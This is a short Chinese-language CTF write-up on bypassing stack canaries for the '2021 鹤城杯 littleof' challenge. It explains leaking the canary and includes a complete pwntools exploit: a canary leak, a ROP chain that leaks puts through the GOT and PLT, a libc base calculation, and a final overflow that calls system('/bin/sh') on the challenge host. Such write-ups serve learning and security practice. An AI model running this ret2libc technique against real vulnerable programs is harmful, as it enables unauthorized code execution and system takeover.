---
title: PWN入门-Canary
date: 2024-02-23 19:26:44
tags: PWN
mathjax: true
---

# PWN入门-Canary

## [2021 鹤城杯]littleof

buf尺寸为0x50，amd64下canary占用后0x8字节，i386下占用0x4字节。为了保证canary能与buf字符串分割开来，设计为小端序最后一个字节为0x00，sendline后自带发送换行符0x0a，即可填充0x00并取得后面0x7字节canary内容。

每次canary内容不同，每次都要重新获取。

开启canary后，0x50-0x8处为canary，0x50处为padding，0x50+0x8处为原ebp。

绕canary劫持plt泄漏puts的got表地址，找libc后重新绕canary打。

libcsearcher日常找不到库。

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p=remote("node4.anna.nssctf.cn",28262)
elf=ELF('./attachment')
stack_overflow=cyclic(0x50-0x8)
payload1=flat([stack_overflow])
p.recvuntil("Do you know how to do buffer overflow?")
p.sendline(payload1)
p.recvuntil("raaa\n")
canary1=u64(p.recv(7).rjust(8,b'\x00'))
log.success("Canary1:"+str(hex(canary1)))
ret_addr=p64(0x40059e)
pop_rdi_ret_addr=p64(0x400863)
canary_padding=p64(0)
main_addr=p64(0x4006E2)
payload2=flat([stack_overflow,canary1,canary_padding,pop_rdi_ret_addr,elf.got["puts"],elf.plt["puts"],main_addr])
p.recvuntil("Try harder!")
p.sendline(payload2)
puts_real_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success("Puts Address:"+str(hex(puts_real_addr)))
libc_addr=puts_real_addr-0x080aa0 #libc6_2.27-3ubuntu1.4_amd64
system_addr=p64(libc_addr+0x04f550)
bin_sh_addr=p64(libc_addr+0x1b3e1a)
p.recvuntil("Do you know how to do buffer overflow?")
payload3=flat([stack_overflow])
p.sendline(payload3)
p.recvuntil("raaa\n")
canary2=u64(p.recv(7).rjust(8,b'\x00'))
payload4=flat([stack_overflow,canary2,canary_padding,ret_addr,pop_rdi_ret_addr,bin_sh_addr,system_addr])
p.recvuntil("Try harder!")
p.sendline(payload4)
p.interactive()
```
